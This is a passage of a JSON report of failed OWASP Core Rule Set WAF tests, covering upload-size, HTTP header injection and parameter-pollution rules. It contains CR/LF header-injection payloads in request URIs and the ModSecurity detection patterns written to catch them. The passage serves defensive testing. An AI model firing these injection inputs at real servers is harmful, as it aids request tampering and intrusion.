1111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n----------111111--\n",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 920410 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule &TX:COMBINED_FILE_SIZES \"@eq 1\" \"id:920410,\\\n  phase:2,\\\n  block,\\\n  t:none,\\\n  msg:'Total uploaded files size too large',\\\n  logdata:'%{MATCHED_VAR_NAME}=%{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-protocol',\\\n  tag:'paranoia-level/1',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/PROTOCOL-ENFORCEMENT',\\\n  tag:'capec/1000/210/272',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  chain\"", "SecRule FILES_COMBINED_SIZE \"@gt %{tx.combined_file_sizes}\" \"t:none,\\\n  setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "921150",
    "test_id" : 1,
    "test_path" : "REQUEST-921-PROTOCOL-ATTACK/921150.yaml",
    "description" : "HTTP Header Injection Attack via payload",
    "cause" : "failed expect_id check: 921150 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)" ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "HTTP Header Injection Attack via payload",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "GET",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "uri" : "/get/script.jsp?variableX=bar&variable2=Y&%0d%0restofdata",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 921150 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule ARGS_NAMES \"@rx [\\n\\r]\" \"id:921150,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  msg:'HTTP Header Injection Attack via payload (CR/LF detected)',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-protocol',\\\n  tag:'paranoia-level/1',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/PROTOCOL-ATTACK',\\\n  tag:'capec/1000/210/272/220/33',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.http_violation_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "921160",
    "test_id" : 1,
    "test_path" : "REQUEST-921-PROTOCOL-ATTACK/921160.yaml",
    "description" : "HTTP Header Injection Attack via payload: w/header, invalid line break, newlines after key",
    "cause" : "failed expect_id check: 921160 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)" ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "HTTP Header Injection Attack via payload: w/header, invalid line break, newlines after key",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "GET",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "uri" : "/script_rule921160.jsp?variableX=bar&variable2=Y&%0d%0Remote-addr%0d%0d%0d:%20foo.bar.com",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 921160 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule ARGS_GET_NAMES|ARGS_GET \"@rx [\\n\\r]+(?:\\s|location|refresh|(?:set-)?cookie|(?:x-)?(?:forwarded-(?:for|host|server)|host|via|remote-ip|remote-addr|originating-IP))\\s*:\" \"id:921160,\\\n  phase:1,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  t:lowercase,\\\n  msg:'HTTP Header Injection Attack via payload (CR/LF and header-name detected)',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-protocol',\\\n  tag:'paranoia-level/1',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/PROTOCOL-ATTACK',\\\n  tag:'capec/1000/210/272/220/33',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.http_violation_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "921180",
    "test_id" : 4,
    "test_path" : "REQUEST-921-PROTOCOL-ATTACK/921180.yaml",
    "description" : "--",
    "cause" : "failed expect_id check: 921180 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 4,
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "GET",
          "port" : 80,
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "uri" : "/?pineapple=pizza&pineapple=aint-pizza",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 921180 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule TX:/paramcounter_.*/ \"@gt 1\" \"id:921180,\\\n  phase:2,\\\n  block,\\\n  msg:'HTTP Parameter Pollution (%{MATCHED_VAR_NAME})',\\\n  logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-protocol',\\\n  tag:'paranoia-level/3',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/PROTOCOL-ATTACK',\\\n  tag:'capec/1000/152/137/15/460',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.http_violation_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl3=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "921180",
    "test_id" : 6,
    "test_path" : "REQUEST-921-PROTOCOL-ATTACK/921180.yaml",
    "description" : "query parameter repetition",
    "cause" : "failed expect_id check: 921180 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 6,
      "desc" : "query parameter repetition",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "GET",
          "port" : 80,
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "uri" : "/?pineapple=pizza&pineapple=aint-pizza&pineapple=is-pizza&pineapple=aint-pizza2",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 921180 ]
          }
        }
      } ]
    },
